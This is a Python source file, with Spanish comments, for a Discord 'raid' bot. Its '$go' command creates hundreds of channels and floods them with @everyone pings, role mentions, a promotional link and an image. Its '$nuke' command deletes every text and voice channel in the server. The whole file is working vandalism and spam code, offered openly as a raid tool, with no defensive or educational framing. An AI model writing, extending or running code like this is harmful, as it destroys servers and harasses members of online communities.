#           __       _     _ 
#   __  __ /__\ __ _(_) __| |
#   \ \/ // \/// _` | |/ _` |
#    >  </ _  \ (_| | | (_| |
#   /_/\_\/ \_/\__,_|_|\__,_|

# Wiki: https://xraid.nuke.cat/
#  Version 1.0.0 - Discord Raid

#     Bot Raid by xPlugins                
#     El comando es [$go]

#   Extra: el bot tiene [$nuke]
#   para borrar todo los canales

import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='$', intents=intents)
# /*
# * Copyright (c) 2025 xGuard / https://xguard.es/terms
# *
# * Permission is hereby granted, free of charge, to any person obtaining a copy
# * of this software and associated documentation files (the "Software"), to deal
# * in the Software without restriction, including without limitation the rights
# * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# * copies of the Software, and to permit persons to whom the Software is
# * furnished to do so, subject to the following conditions:
# *
# * The above copyright notice and this permission notice shall be included in all
# * copies or substantial portions of the Software.
# *
# * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
# * EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
# * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
# * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
# * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
# * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
# */
@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user}')

@bot.command()
async def go(ctx, num_channels: int = 500, num_messages: int = 500, message: str = '## @everyone raid lmao https://discord.xraid.cat', mention_roles: bool = True):
    guild = ctx.guild
    if not guild.me.guild_permissions.manage_channels:
        await ctx.send("No tengo permisos para crear canales en este servidor.")
        return
    if not guild.me.guild_permissions.send_messages:
        await ctx.send("No tengo permisos para enviar mensajes en este servidor.")
        return

    image_url = 'https://i.postimg.cc/5t9YsXXs/Photoshop-Extension-Image.jpg'

    # Crear todos los canales de una vez
    created_channels = []
    for _ in range(num_channels):
        try:
            channel = await guild.create_text_channel('raid-channel')
            created_channels.append(channel)
        except discord.errors.Forbidden:
            await ctx.send("No tengo permisos para crear canales en este servidor.")
            return
        except discord.errors.HTTPException as e:
            await ctx.send(f"Error al crear un canal: {e}")
            return

    # Enviar mensajes en todos los canales creados
    for channel in created_channels:
        for _ in range(num_messages):
            try:
                await channel.send(message)
                await channel.send(image_url)
                if mention_roles:
                    for role in guild.roles:
                        try:
                            await channel.send(role.mention)
                        except discord.errors.Forbidden:
                            pass
            except discord.errors.Forbidden:
                await ctx.send(f"No tengo permisos para enviar mensajes en el canal {channel.name}.")
            except discord.errors.HTTPException as e:
                await ctx.send(f"Error al enviar mensaje en el canal {channel.name}: {e}")

@bot.command()
async def nuke(ctx):
    guild = ctx.guild
    if not guild.me.guild_permissions.manage_channels:
        await ctx.send("No tengo permisos para eliminar canales en este servidor.")
        return

    for channel in guild.text_channels:
        try:
            await channel.delete()
        except discord.errors.Forbidden:
            await ctx.send(f"No tengo permisos para eliminar el canal {channel.name}.")
        except discord.errors.HTTPException as e:
            await ctx.send(f"Error al eliminar el canal {channel.name}: {e}")

    for channel in guild.voice_channels:
        try:
            await channel.delete()
        except discord.errors.Forbidden:
            await ctx.send(f"No tengo permisos para eliminar el canal {channel.name}.")
        except discord.errors.HTTPException as e:
            await ctx.send(f"Error al eliminar el canal {channel.name}: {e}")

# * Pon el token del bot donde dice "TU_TOKEN_AQUI"
bot.run('TU_TOKEN_AQUI')